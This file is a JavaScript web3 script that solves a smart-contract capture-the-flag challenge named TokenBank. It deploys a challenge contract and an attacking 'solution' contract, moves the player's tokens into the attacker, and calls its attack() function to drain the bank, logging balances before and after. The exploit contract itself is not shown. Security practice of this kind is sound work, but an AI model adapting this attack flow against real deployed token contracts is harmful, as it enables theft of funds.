require('dotenv-safe').config();
const path = require('path')
const assert = require('assert')
const utils = require('web3-utils')

const { createWeb3, network } = require('../web3')
const { createContract } = require('../contracts')
const { createDeployedStore, deployedStorePath } = require('../deployed')
const { sendAllEther, hex32ToAddress } = require('../utils')
const { createJsonStorage } = require('../json-storage')

const CHALLENGE_CONTRACT_NAME = 'TokenBankChallenge'
const SOLUTION_CONTRACT_NAME = 'TokenBankSolution'
const CHALLENGE_FACTORY_CONTRACT_NAME = 'TokenBankChallengeFactory'
const TOKEN_CONTRACT_NAME = 'SimpleERC223Token'
const SOLUTION_DB_PATH = path.resolve(process.cwd(), 'db', 'token-bank.json')

const isDevelop = network === 'develop'

const debug = require('debug')('app')
const web3 = createWeb3()
const accounts = web3.eth.accounts
const defaultAccount = web3.eth.defaultAccount
const BN = utils.BN

async function main() {
  const deployed = createDeployedStore(deployedStorePath(network))
  const solutionDB = createJsonStorage(SOLUTION_DB_PATH)

  const $createContract = createContract(web3, {
    gas: 2000000,
    from: web3.eth.defaultAccount,
  })

  const challenge = await Promise.resolve(CHALLENGE_CONTRACT_NAME)
    .then(contractName => {
      const address = deployed.get(contractName)
      if (!isDevelop) {
        assert(address, `${contractName} has to be deployed`)
      }
      const instance = $createContract(contractName, address)
      return (
        address
          ? instance
          : instance
              .deploy({
                arguments: [
                  defaultAccount,
                ]
              })
              .send()
              .then(inst => {
                assert(inst.options.address, 'No contract address!')
                debug('deployed new contract', contractName, 'at', inst.options.address)
                deployed.set(contractName, inst.options.address)
                return inst
              })
      )
    })

  /**
   * @param {number|string} position
   */
  const getChallengeStorageAt = (position) => web3.eth.getStorageAt(challenge.options.address, position)

  const tokenAddress = await getChallengeStorageAt(0).then(hex32ToAddress)
  debug({ tokenAddress })

  const token = await Promise.resolve(TOKEN_CONTRACT_NAME)
    .then(contractName => $createContract(contractName, tokenAddress))

  const solution = await Promise.resolve(SOLUTION_CONTRACT_NAME)
    .then((contractName) => {
      const address = deployed.get(contractName)
      const instance = $createContract(contractName, address)
      return (
        address
          ? instance
          : instance
              .deploy({
                arguments: [
                  challenge.options.address,
                  token.options.address,
                ]
              })
              .send()
              .then(inst => {
                assert(inst.options.address, 'No contract address!')
                debug('deployed new contract', contractName, 'at', inst.options.address)
                deployed.set(contractName, inst.options.address)
                return inst
              })
      )
    })

  async function printBankBalance() {
    debug('-- BANK BALANCE --')

    const [
      playerBalance,
      solutionBalance
    ] = await Promise.all([
      challenge.methods.balanceOf(defaultAccount).call(),
      challenge.methods.balanceOf(solution.options.address).call(),
    ])

    debug({ playerBalance, solutionBalance })
  }

  async function printTokenBalance() {
    debug('-- TOKEN BALANCE --')
    const [
      playerBalance,
      challengeBalance,
      solutionBalance
    ] = await Promise.all([
      token.methods.balanceOf(defaultAccount).call(),
      token.methods.balanceOf(challenge.options.address).call(),
      token.methods.balanceOf(solution.options.address).call(),
    ])

    debug({ playerBalance, solutionBalance, challengeBalance })
  }

  await printBankBalance()
  await printTokenBalance()

  let isComplete = await challenge.methods.isComplete().call()
  debug({ isComplete })
  if (isComplete) {
    return;
  }

  const amount = await challenge.methods.balanceOf(defaultAccount).call()

  debug('moving funds to the attacking contract', { amount })
  // top up our attacking contract
  await challenge.methods.withdraw(amount).send()
  await token.methods.transfer(solution.options.address, amount).send()

  debug('~~~~ Attack!!! ~~~~')
  const recipe = await solution.methods.attack().send()
  debug(recipe)

  await printBankBalance()
  await printTokenBalance()
  isComplete = await challenge.methods.isComplete().call()
  debug({ isComplete })
}

main()
